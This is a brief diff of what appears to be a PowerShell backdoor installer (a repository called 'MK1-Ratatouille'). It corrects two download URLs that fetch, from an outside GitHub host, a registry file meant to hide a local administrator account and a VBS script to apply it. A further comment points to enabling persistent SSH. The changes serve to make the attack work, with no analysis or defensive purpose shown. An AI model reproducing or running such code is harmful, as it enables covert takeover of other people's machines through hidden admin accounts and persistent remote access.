@@ -42,10 +42,10 @@ Set-Location $path
 
 
 # registry to hide local admin
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wreb.reg' -OutFile "wrev.reg"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg' -OutFile "wrev.reg"
 
 # visual basic script to register the regisry
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/confirm.vbs' -OutFile "calty.vbs"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs' -OutFile "calty.vbs"
 
 
 # enabling persistent ssh
